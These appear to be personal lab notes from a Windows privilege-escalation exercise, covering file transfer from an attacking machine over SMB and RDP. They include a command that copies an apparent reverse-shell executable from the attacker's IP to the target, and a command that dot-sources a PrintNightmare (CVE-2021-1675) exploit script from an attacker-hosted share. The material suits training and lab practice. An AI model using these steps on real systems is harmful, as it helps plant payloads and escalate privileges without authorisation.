
---
### SMB Sharing

- go to folder path where you want to share the files
- Convert your machine into a smb server using

```
~THM/winprixesc  sudo impacket-smbserver share .
```

```
 `impacket-smbserver`: This is the command you are running. It is part of the `impacket` library
    
`share`: This is the name you are giving to the shared resource on the SMB server. Clients can connect to this server and access files under the "share" name.
    
`.`: it means that the SMB server will share the contents of the current directory.
```

- Now open your windows command line and use this command
```
copy \\10.17.24.189\share\reverse.exe C:\PrivEsc\reverse.exe
```

---

### RDP sharing

- Reference - [[6. Using RDP to transfer files from kali to windows]]

```
xfreerdp /v:10.10.25.75 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```


- `/drive:share,/tmp` -- this shares our own `/tmp` directory with the target. This is an _extremely_ useful trick as it allows us to execute scripts and programs from our own machine without actually transferring them to the target (we will see this in action later!)

- Accessing these shares in windows machine by opening a powershell session

We can import it using:  
```
. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1
```

- Make sure to include the dot at the start!

- This uses dot-syntax to import any functions exposed by the script. We are using `\\tsclient\share` to reference the share that we created. 

- This allows us to view (and thus import) files that are stored in the /tmp folder of our own attacking machine!

---


